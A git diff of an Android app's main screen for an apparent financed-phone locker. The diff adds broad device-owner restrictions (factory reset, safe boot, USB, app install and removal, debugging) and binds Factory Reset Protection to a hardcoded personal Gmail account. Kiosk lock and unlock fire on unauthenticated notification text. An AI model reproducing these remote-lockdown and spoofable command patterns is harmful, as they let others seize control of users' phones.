@@ -32,6 +32,7 @@ import android.app.AlertDialog
 import android.os.UserManager
 import android.net.Uri
 import android.view.View
+import android.app.admin.FactoryResetProtectionPolicy
 
 class MainActivity : AppCompatActivity() {
 
@@ -41,7 +42,7 @@ class MainActivity : AppCompatActivity() {
     private lateinit var componentName: ComponentName
     private lateinit var tvStatus: TextView
     private lateinit var prefs: SharedPreferences
-    private lateinit var sharedPref: SharedPreferences  // ✅ এটা ব্যবহৃত হবে
+    private lateinit var sharedPref: SharedPreferences
     private lateinit var vibrator: Vibrator
     private lateinit var windowManager: WindowManager
 
@@ -57,8 +58,8 @@ class MainActivity : AppCompatActivity() {
         const val KEY_FACTORY_RESET_DISABLED = "factory_reset_disabled"
         const val OVERLAY_PERMISSION_REQUEST = 102
 
-        // FCM লগ ট্যাগ
         private const val FCM_LOG_TAG = "FCM_MAIN"
+        private const val FRP_GOOGLE_ACCOUNT = "uzzal.biswas.cse@gmail.com"
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -66,17 +67,16 @@ class MainActivity : AppCompatActivity() {
         setContentView(R.layout.activity_main)
 
         Log.d(FCM_LOG_TAG, "══════════════════════════════════════")
-        Log.d(FCM_LOG_TAG, "📱 MainActivity শুরু হয়েছে")
+        Log.d(FCM_LOG_TAG, "MainActivity started")
         Log.d(FCM_LOG_TAG, "══════════════════════════════════════")
 
-        // ✅ সব ভ্যারিয়েবল ইনিশিয়ালাইজ করা
         devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
         componentName = ComponentName(this, DeviceAdminReceiver::class.java)
-        adminComponent = componentName  // ✅ এইটা যোগ করা হয়েছে
-        dpm = devicePolicyManager  // ✅ এইটা যোগ করা হয়েছে
+        adminComponent = componentName
+        dpm = devicePolicyManager
 
         prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
-        sharedPref = prefs  // ✅ একই SharedPreferences ব্যবহার করছি
+        sharedPref = prefs
 
         vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
         windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
@@ -85,99 +85,60 @@ class MainActivity : AppCompatActivity() {
         tvStatus = findViewById(R.id.tvStatus)
 
         findViewById<Button>(R.id.btnGetFcmToken).setOnClickListener {
-            Log.d(FCM_LOG_TAG, "ইউজার ক্লিক করেছেন: Get FCM Token")
+            Log.d(FCM_LOG_TAG, "User clicked: Get FCM Token")
             getAndDisplayFCMToken()
         }
 
 
 
-        // ৪. ফ্যাক্টরি রিসেট কন্ট্রোল
         findViewById<Button>(R.id.disableFactoryReset).setOnClickListener {
             setFactoryReset(false)
         }
 
-        // 5. ফ্যাক্টরি রিসেট কন্ট্রোল
         findViewById<Button>(R.id.enableFactoryReset).setOnClickListener {
             setFactoryReset(true)
         }
 
-        // 5. ফ্যাক্টরি রিসেট কন্ট্রোল
         findViewById<Button>(R.id.lockPhone).setOnClickListener {
             saveLockState(true)
             enableKioskMode()
         }
 
-        // 5. ফ্যাক্টরি রিসেট কন্ট্রোল
         findViewById<Button>(R.id.unlockPhone).setOnClickListener {
             saveLockState(false)
             disableKioskMode()
         }
 
-        // 6. open chrome
         findViewById<Button>(R.id.permissionforChrom).setOnClickListener {
             openChromeOnly()
         }
 
-        // ফোরগ্রাউন্ড সার্ভিস শুরু করা
         startForegroundServiceForFCM()
-
-        // FCM নোটিফিকেশন হ্যান্ডেল করা
         handleFCMNotification()
-
-        // স্বয়ংক্রিয় চেক করা
         checkFCMStatus()
-
-        // রিবুটের পর লক স্টেট চেক করা
         checkAndRestoreLockState()
     }
 
 
     // ==============================================
-// ✅ শুধু Chrome ওপেন করা
-// ==============================================
+    // Chrome open
+    // ==============================================
 
     private fun openChromeOnly() {
         try {
-            // Chrome এর প্যাকেজ নাম
             val chromePackage = "com.example.counter_app"
-
-            // Chrome লঞ্চ করার Intent পাওয়ার চেষ্টা
             val chromeIntent = packageManager.getLaunchIntentForPackage(chromePackage)
 
             if (chromeIntent != null) {
-                // Chrome ওপেন করা
                 chromeIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                 startActivity(chromeIntent)
             } else {
-                // Chrome ইনস্টল নেই
-                Toast.makeText(
-                    this,
-                    "❌ Chrome ব্রাউজার ইনস্টল নেই",
-                    Toast.LENGTH_LONG
-                ).show()
+                Toast.makeText(this, "Chrome not installed", Toast.LENGTH_LONG).show()
             }
         } catch (e: Exception) {
-            // কোনো ত্রুটি হলে
-            Toast.makeText(
-                this,
-                "❌ Chrome ওপেন করা যায়নি",
-                Toast.LENGTH_SHORT
-            ).show()
+            Toast.makeText(this, "Cannot open Chrome", Toast.LENGTH_SHORT).show()
         }
     }
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 
     fun Button.hide() {
@@ -187,6 +148,7 @@ class MainActivity : AppCompatActivity() {
     fun Button.show() {
         this.visibility = View.VISIBLE
     }
+
     private fun checkAndRestoreLockState() {
         val wasLocked = prefs.getBoolean("was_locked_before_reboot", false)
 
@@ -207,7 +169,7 @@ class MainActivity : AppCompatActivity() {
     }
 
     // ==============================================
-    // ✅ Firebase থেকে নোটিফিকেশন হ্যান্ডেল করা
+    // Firebase Notification Handler
     // ==============================================
 
     private fun handleFCMNotification() {
@@ -215,9 +177,9 @@ class MainActivity : AppCompatActivity() {
         val body = intent?.getStringExtra("body")
 
         Log.d(FCM_LOG_TAG, "══════════════════════════════════════")
-        Log.d(FCM_LOG_TAG, "🔍 FCM নোটিফিকেশন চেক করা হচ্ছে...")
-        Log.d(FCM_LOG_TAG, "শিরোনাম: $title")
-        Log.d(FCM_LOG_TAG, "বিস্তারিত: $body")
+        Log.d(FCM_LOG_TAG, "Checking FCM notification...")
+        Log.d(FCM_LOG_TAG, "Title: $title")
+        Log.d(FCM_LOG_TAG, "Body: $body")
         Log.d(FCM_LOG_TAG, "══════════════════════════════════════")
 
         if (body != null) {
@@ -226,15 +188,14 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun checkBodyForCommands(body: String, title: String?) {
-        Log.d(FCM_LOG_TAG, "📝 নোটিফিকেশন বিশ্লেষণ করা হচ্ছে: $body  $title")
+        Log.d(FCM_LOG_TAG, "Analyzing notification: $body  $title")
 
         val lowerBody = body.lowercase(Locale.getDefault())
 
         when {
             lowerBody.contains("account status is now active") -> {
-                Log.d(FCM_LOG_TAG, "✅ ACTIVE কমান্ড পাওয়া গেছে - স্ক্রীন লক করা হবে")
+                Log.d(FCM_LOG_TAG, "ACTIVE command found - locking screen")
                 handler.postDelayed({
-                //    Toast.makeText(this, "🔒 স্ক্রীন লক করা হয়েছে: অ্যাকাউন্ট একটিভ", Toast.LENGTH_LONG).show()
                     saveLockState(true)
                     enableKioskMode()
                     findViewById<Button>(R.id.disableFactoryReset).hide()
@@ -243,18 +204,18 @@ class MainActivity : AppCompatActivity() {
             }
 
             lowerBody.contains("account status is now inactive") -> {
-                Log.d(FCM_LOG_TAG, "✅ INACTIVE কমান্ড পাওয়া গেছে - স্ক্রীন আনলক করা হবে")
+                Log.d(FCM_LOG_TAG, "INACTIVE command found - unlocking screen")
                 handler.postDelayed({
                     saveLockState(false)
                     disableKioskMode()
                     findViewById<Button>(R.id.disableFactoryReset).hide()
                     findViewById<Button>(R.id.btnGetFcmToken).hide()
-                    Toast.makeText(this, "🔓 স্ক্রীন আনলক করা হয়েছে: অ্যাকাউন্ট ইনএকটিভ", Toast.LENGTH_LONG).show()
+                    Toast.makeText(this, "Screen unlocked: Account inactive", Toast.LENGTH_LONG).show()
                 }, 1000)
             }
 
             lowerBody.contains("account status is now pending") -> {
-                Log.d(FCM_LOG_TAG, "✅ PENDING কমান্ড পাওয়া গেছে - ফ্যাক্টরি রিসেট চালু করা হবে")
+                Log.d(FCM_LOG_TAG, "PENDING command found - enabling factory reset")
                 handler.postDelayed({
                     setFactoryReset(true)
                     findViewById<Button>(R.id.disableFactoryReset).show()
@@ -262,24 +223,17 @@ class MainActivity : AppCompatActivity() {
                 }, 1000)
             }
 
-            lowerBody.contains("account status is now pending") -> {
-                Log.d(FCM_LOG_TAG, "✅ PENDING কমান্ড পাওয়া গেছে - ফ্যাক্টরি রিসেট চালু করা হবে")
-                handler.postDelayed({
-                    setFactoryReset(true)
-                }, 1000)
-            }
-
             else -> {
-                Log.d(FCM_LOG_TAG, "ℹ️ লক/আনলক কমান্ড পাওয়া যায়নি")
+                Log.d(FCM_LOG_TAG, "No lock/unlock command found")
                 if (title != null) {
-                    Toast.makeText(this, "নোটিফিকেশন: $title", Toast.LENGTH_LONG).show()
+                    Toast.makeText(this, "Notification: $title", Toast.LENGTH_LONG).show()
                 }
             }
         }
     }
 
     // ==============================================
-    // ✅ ডিভাইস স্ট্যাটাস সার্ভারে পাঠানো
+    // Device Status to Server
     // ==============================================
 
     private fun sendStatusToServer() {
@@ -297,41 +251,41 @@ class MainActivity : AppCompatActivity() {
                 connection.setRequestProperty("User-Agent", "Android-App")
 
                 val responseCode = connection.responseCode
-                Log.d("StatusUpdate", "রেসপন্স কোড: $responseCode")
+                Log.d("StatusUpdate", "Response code: $responseCode")
 
                 if (responseCode == 200) {
-                    Log.d(FCM_LOG_TAG, "✅ স্ট্যাটাস সার্ভারে পাঠানো হয়েছে")
+                    Log.d(FCM_LOG_TAG, "Status sent to server")
                 }
             } catch (e: Exception) {
-                Log.e("StatusUpdate", "ত্রুটি: ${e.message}")
+                Log.e("StatusUpdate", "Error: ${e.message}")
             }
         }.start()
     }
 
     private fun getDeviceStatus(): String {
         return StringBuilder().apply {
-            append("ডিভাইস ওনার: ${if (isDeviceOwner()) "✅" else "❌"}\n")
-            append("ডিভাইস অ্যাডমিন: ${if (devicePolicyManager.isAdminActive(componentName)) "✅" else "❌"}\n")
-            append("স্ক্রীন লক: ${if (isTouchLocked) "🔒" else "🔓"}\n")
-            append("ওভারলে পারমেনেন্ট: ${if (prefs.getBoolean("overlay_permanent_enabled", false)) "✅" else "❌"}\n")
-            append("ফ্যাক্টরি রিসেট: ${if (prefs.getBoolean(KEY_FACTORY_RESET_DISABLED, false)) "🔒" else "🔓"}")
+            append("Device Owner: ${if (isDeviceOwner()) "YES" else "NO"}\n")
+            append("Device Admin: ${if (devicePolicyManager.isAdminActive(componentName)) "YES" else "NO"}\n")
+            append("Screen Lock: ${if (isTouchLocked) "LOCKED" else "UNLOCKED"}\n")
+            append("Overlay Permanent: ${if (prefs.getBoolean("overlay_permanent_enabled", false)) "YES" else "NO"}\n")
+            append("Factory Reset: ${if (prefs.getBoolean(KEY_FACTORY_RESET_DISABLED, false)) "LOCKED" else "UNLOCKED"}")
         }.toString()
     }
 
     // ==============================================
-    // ✅ ফোরগ্রাউন্ড সার্ভিস
+    // Foreground Service
     // ==============================================
 
     private fun startForegroundServiceForFCM() {
         try {
             if (!isForegroundServiceRunning()) {
                 ForegroundNotificationService.startService(this)
-                Log.d(FCM_LOG_TAG, "🚀 ফোরগ্রাউন্ড সার্ভিস শুরু করা হয়েছে")
+                Log.d(FCM_LOG_TAG, "Foreground service started")
             } else {
-                Log.d(FCM_LOG_TAG, "✅ ফোরগ্রাউন্ড সার্ভিস ইতিমধ্যে চলছে")
+                Log.d(FCM_LOG_TAG, "Foreground service already running")
             }
         } catch (e: Exception) {
-            Log.e(FCM_LOG_TAG, "❌ ফোরগ্রাউন্ড সার্ভিস শুরু করতে ব্যর্থ: ${e.message}")
+            Log.e(FCM_LOG_TAG, "Failed to start foreground service: ${e.message}")
         }
     }
 
@@ -342,31 +296,31 @@ class MainActivity : AppCompatActivity() {
     }
 
     // ==============================================
-    // FCM টোকেন ম্যানেজমেন্ট
+    // FCM Token Management
     // ==============================================
 
     private fun checkFCMStatus() {
         val token = getStoredToken()
         if (token != null) {
-            Log.d(FCM_LOG_TAG, "✅ সংরক্ষিত FCM টোকেন: ${token.take(20)}...")
+            Log.d(FCM_LOG_TAG, "Stored FCM token: ${token.take(20)}...")
         } else {
-            Log.d(FCM_LOG_TAG, "❌ কোন FCM টোকেন সংরক্ষিত নেই")
+            Log.d(FCM_LOG_TAG, "No FCM token stored")
         }
     }
 
     private fun getAndDisplayFCMToken() {
-        Log.d(FCM_LOG_TAG, "🔄 Firebase থেকে FCM টোকেন রিকোয়েস্ট করা হচ্ছে...")
+        Log.d(FCM_LOG_TAG, "Requesting FCM token from Firebase...")
 
         FirebaseMessaging.getInstance().token.addOnCompleteListener(OnCompleteListener { task ->
             if (!task.isSuccessful) {
-                val error = task.exception?.message ?: "অজানা ত্রুটি"
-                Log.e(FCM_LOG_TAG, "❌ FCM টোকেন ত্রুটি: $error")
+                val error = task.exception?.message ?: "Unknown error"
+                Log.e(FCM_LOG_TAG, "FCM token error: $error")
 
                 val userMsg = when {
-                    error.contains("AUTHENTICATION_FAILED") -> "Firebase সেটআপ সমস্যা"
-                    error.contains("SERVICE_NOT_AVAILABLE") -> "Google Play সার্ভিস প্রয়োজন"
-                    error.contains("NETWORK") -> "ইন্টারনেট কানেকশন প্রয়োজন"
-                    else -> "টোকেন পাওয়া যায়নি"
+                    error.contains("AUTHENTICATION_FAILED") -> "Firebase setup issue"
+                    error.contains("SERVICE_NOT_AVAILABLE") -> "Google Play Services required"
+                    error.contains("NETWORK") -> "Internet connection required"
+                    else -> "Token not available"
                 }
 
                 Toast.makeText(this, userMsg, Toast.LENGTH_LONG).show()
@@ -375,28 +329,23 @@ class MainActivity : AppCompatActivity() {
 
             val token = task.result
             Log.d(FCM_LOG_TAG, "══════════════════════════════════════")
-            Log.d(FCM_LOG_TAG, "✅ FCM টোকেন সফলভাবে পাওয়া গেছে!")
-            Log.d(FCM_LOG_TAG, "টোকেন দৈর্ঘ্য: ${token.length} অক্ষর")
+            Log.d(FCM_LOG_TAG, "FCM token received successfully!")
+            Log.d(FCM_LOG_TAG, "Token length: ${token.length} chars")
             Log.d(FCM_LOG_TAG, "══════════════════════════════════════")
 
-            // কপির জন্য টোকেন প্রিন্ট করা
-            println("\n🎯 এই টোকেনটি কপি করুন 🎯")
+            println("\nCopy this token:")
             println(token)
-            println("🎯 টোকেন শেষ 🎯\n")
+            println("Token end\n")
 
-            // ডিভাইস আইডি পাওয়া
             val deviceId = Settings.Secure.getString(contentResolver,
                 Settings.Secure.ANDROID_ID) ?: "unknown"
 
-            // ডিভাইস রেজিস্টার করা (ব্যাকগ্রাউন্ডে)
             sendRegistrationData(deviceId, token)
-
-            // টোকেন লোকালি সেভ করা
             saveToken(token)
 
             Toast.makeText(
                 this,
-                "টোকেন সেভ করা হয়েছে! সম্পূর্ণ টোকেন Logcat এ দেখুন",
+                "Token saved! See full token in Logcat",
                 Toast.LENGTH_LONG
             ).show()
 
@@ -406,23 +355,21 @@ class MainActivity : AppCompatActivity() {
     private fun sendRegistrationData(deviceId: String, token: String) {
         Thread {
             try {
-                // ডিভাইস রেজিস্টার করা
                 val registerUrl = "https://ephonelocker.info/api/register?imei_number=$deviceId&name=${Build.MANUFACTURER} ${Build.MODEL}&phone=01700000009&email=$deviceId@example.com&address=Dhaka, Bangladesh&nominee_name=Nominee Name&nominee_phone=01800000009&total_amount=50000&down_payment=10000&interval_type=1&interval_value=6&payable_amount=40000&per_installment=3333.33&bill_date=2025-01-15&admin_id=2"
-                Log.d("RequestURL", "রেজিস্টার URL: $registerUrl")
+                Log.d("RequestURL", "Register URL: $registerUrl")
 
                 sendPostRequest(registerUrl)
 
-                // FCM টোকেন সার্ভারে সেভ করা
                 val tokenUrl = "https://ephonelocker.info/api/save-firebase-token?token=$token&imei=$deviceId"
-                Log.d("RequestURL", "টোকেন URL: $tokenUrl")
+                Log.d("RequestURL", "Token URL: $tokenUrl")
 
                 sendPostRequest(tokenUrl)
 
             } catch (e: Exception) {
-                Log.e("Registration", "ত্রুটি: ${e.message}")
+                Log.e("Registration", "Error: ${e.message}")
                 runOnUiThread {
                     Toast.makeText(this@MainActivity,
-                        "রেজিস্টারেশন ত্রুটি: ${e.message}", Toast.LENGTH_SHORT).show()
+                        "Registration error: ${e.message}", Toast.LENGTH_SHORT).show()
                 }
             }
         }.start()
@@ -439,28 +386,28 @@ class MainActivity : AppCompatActivity() {
             connection.readTimeout = 10000
 
             val responseCode = connection.responseCode
-            Log.d("POST Response", "রেসপন্স কোড: $responseCode")
+            Log.d("POST Response", "Response code: $responseCode")
 
             val response = if (responseCode == HttpURLConnection.HTTP_OK) {
                 connection.inputStream.bufferedReader().use { it.readText() }
             } else {
-                connection.errorStream?.bufferedReader()?.use { it.readText() } ?: "কোন রেসপন্স নেই"
+                connection.errorStream?.bufferedReader()?.use { it.readText() } ?: "No response"
             }
 
-            Log.d("POST Response", "রেসপন্স: ${if (response.length > 200) response.substring(0, 200) + "..." else response}")
+            Log.d("POST Response", "Response: ${if (response.length > 200) response.substring(0, 200) + "..." else response}")
 
             runOnUiThread {
                 if (responseCode == 200) {
-                    Toast.makeText(this, "সার্ভার রিকোয়েস্ট সফল", Toast.LENGTH_SHORT).show()
+                    Toast.makeText(this, "Server request successful", Toast.LENGTH_SHORT).show()
                 } else {
-                    Toast.makeText(this, "সার্ভার রিটার্ন: $responseCode", Toast.LENGTH_SHORT).show()
+                    Toast.makeText(this, "Server returned: $responseCode", Toast.LENGTH_SHORT).show()
                 }
             }
 
         } catch (e: Exception) {
             Log.e("POST Error", e.toString())
             runOnUiThread {
-                Toast.makeText(this, "ত্রুটি: ${e.message}", Toast.LENGTH_SHORT).show()
+                Toast.makeText(this, "Error: ${e.message}", Toast.LENGTH_SHORT).show()
             }
         }
     }
@@ -471,7 +418,7 @@ class MainActivity : AppCompatActivity() {
             putLong("token_time", System.currentTimeMillis())
             apply()
         }
-        Log.d(FCM_LOG_TAG, "💾 টোকেন সেভ করা হয়েছে: ${token.take(15)}...")
+        Log.d(FCM_LOG_TAG, "Token saved: ${token.take(15)}...")
     }
 
     private fun getStoredToken(): String? {
@@ -482,10 +429,10 @@ class MainActivity : AppCompatActivity() {
         isTouchLocked = locked
         sharedPref.edit().apply {
             putBoolean("isLocked", locked)
-            putBoolean("was_locked_before_reboot", locked)  // ✅ রিবুটের জন্য সেভ করা
+            putBoolean("was_locked_before_reboot", locked)
             apply()
         }
-        Toast.makeText(this, if (locked) "🔒 লক স্টেট সেভ করা হয়েছে" else "🔓 আনলক স্টেট সেভ করা হয়েছে",
+        Toast.makeText(this, if (locked) "Lock state saved" else "Unlock state saved",
             Toast.LENGTH_SHORT).show()
     }
 
@@ -496,14 +443,13 @@ class MainActivity : AppCompatActivity() {
                 startLockTask()
                 isTouchLocked = true
                 saveLockState(true)
-                Toast.makeText(this, "🔒 ফোন লক করা হয়েছে (কিওস্ক মোড)", Toast.LENGTH_SHORT).show()
+                Toast.makeText(this, "Phone locked (Kiosk Mode)", Toast.LENGTH_SHORT).show()
             } catch (e: Exception) {
-                Log.e("KIOSK", "লক ত্রুটি: ${e.message}")
-                Toast.makeText(this, "কিওস্ক মোডে ত্রুটি: ${e.message}", Toast.LENGTH_SHORT).show()
+                Log.e("KIOSK", "Lock error: ${e.message}")
+                Toast.makeText(this, "Kiosk mode error: ${e.message}", Toast.LENGTH_SHORT).show()
             }
         } else {
-            Toast.makeText(this, "❌ ডিভাইস ওনার প্রয়োজন", Toast.LENGTH_LONG).show()
-
+            Toast.makeText(this, "Device Owner required", Toast.LENGTH_LONG).show()
         }
     }
 
@@ -512,25 +458,68 @@ class MainActivity : AppCompatActivity() {
             stopLockTask()
             isTouchLocked = false
             saveLockState(false)
-            Toast.makeText(this, "🔓 ফোন আনলক হয়েছে", Toast.LENGTH_SHORT).show()
+            Toast.makeText(this, "Phone unlocked", Toast.LENGTH_SHORT).show()
         } catch (e: Exception) {
-            Log.e("KIOSK", "আনলক ত্রুটি: ${e.message}")
+            Log.e("KIOSK", "Unlock error: ${e.message}")
         }
     }
 
 
     private fun setFactoryReset(isEnabled: Boolean) {
         if (isDeviceOwner()) {
+            val restrictions = arrayOf(
+                UserManager.DISALLOW_FACTORY_RESET,
+                UserManager.DISALLOW_SAFE_BOOT,
+                UserManager.DISALLOW_USB_FILE_TRANSFER,
+                UserManager.DISALLOW_INSTALL_APPS,
+                UserManager.DISALLOW_UNINSTALL_APPS,
+                UserManager.DISALLOW_ADD_USER,
+                UserManager.DISALLOW_DEBUGGING_FEATURES
+            )
             if (isEnabled) {
-                dpm.clearUserRestriction(adminComponent, UserManager.DISALLOW_FACTORY_RESET)
-                Toast.makeText(this, "✅ ফ্যাক্টরি রিসেট চালু করা হয়েছে", Toast.LENGTH_SHORT).show()
+                for (r in restrictions) {
+                    dpm.clearUserRestriction(adminComponent, r)
+                }
+                disableFRP()
+                Toast.makeText(this, "All restrictions removed + FRP off", Toast.LENGTH_SHORT).show()
             } else {
-                dpm.addUserRestriction(adminComponent, UserManager.DISALLOW_FACTORY_RESET)
-                Toast.makeText(this, "🚫 ফ্যাক্টরি রিসেট বন্ধ করা হয়েছে", Toast.LENGTH_SHORT).show()
+                for (r in restrictions) {
+                    dpm.addUserRestriction(adminComponent, r)
+                }
+                enableFRP()
+                Toast.makeText(this, "All restrictions applied + FRP on", Toast.LENGTH_SHORT).show()
             }
         } else {
-            Toast.makeText(this, "❌ ফ্যাক্টরি রিসেট কন্ট্রোলের জন্য ডিভাইস ওনার প্রয়োজন",
+            Toast.makeText(this, "Device Owner required",
                 Toast.LENGTH_LONG).show()
+        }
+    }
+
+    private fun enableFRP() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            try {
+                val policy = FactoryResetProtectionPolicy.Builder()
+                    .setFactoryResetProtectionAccounts(listOf(FRP_GOOGLE_ACCOUNT))
+                    .setFactoryResetProtectionEnabled(true)
+                    .build()
+                dpm.setFactoryResetProtectionPolicy(adminComponent, policy)
+                Log.d("FRP", "FRP enabled with account: $FRP_GOOGLE_ACCOUNT")
+            } catch (e: Exception) {
+                Log.e("FRP", "FRP error: ${e.message}")
+            }
+        } else {
+            Log.d("FRP", "FRP policy requires Android 11+")
+        }
+    }
+
+    private fun disableFRP() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            try {
+                dpm.setFactoryResetProtectionPolicy(adminComponent, null)
+                Log.d("FRP", "FRP disabled")
+            } catch (e: Exception) {
+                Log.e("FRP", "FRP disable error: ${e.message}")
+            }
         }
     }
 
@@ -541,13 +530,13 @@ class MainActivity : AppCompatActivity() {
         when (requestCode) {
             REQUEST_CODE_ENABLE_ADMIN -> {
                 if (resultCode == Activity.RESULT_OK) {
-                    Toast.makeText(this, "✅ ডিভাইস অ্যাডমিন সক্রিয় করা হয়েছে", Toast.LENGTH_SHORT).show()
+                    Toast.makeText(this, "Device Admin activated", Toast.LENGTH_SHORT).show()
                 } else {
-                    Toast.makeText(this, "❌ ডিভাইস অ্যাডমিন সক্রিয় করা হয়নি", Toast.LENGTH_SHORT).show()
+                    Toast.makeText(this, "Device Admin not activated", Toast.LENGTH_SHORT).show()
                 }
             }
             else -> {
-                Toast.makeText(this, "অন্যান্য রেজাল্ট", Toast.LENGTH_SHORT).show()
+                Toast.makeText(this, "Other result", Toast.LENGTH_SHORT).show()
             }
         }
     }
@@ -566,7 +555,7 @@ class MainActivity : AppCompatActivity() {
     override fun onNewIntent(intent: Intent) {
         super.onNewIntent(intent)
         setIntent(intent)
-        Log.d(FCM_LOG_TAG, "🔄 onNewIntent কল হয়েছে")
+        Log.d(FCM_LOG_TAG, "onNewIntent called")
         handleFCMNotification()
     }
 
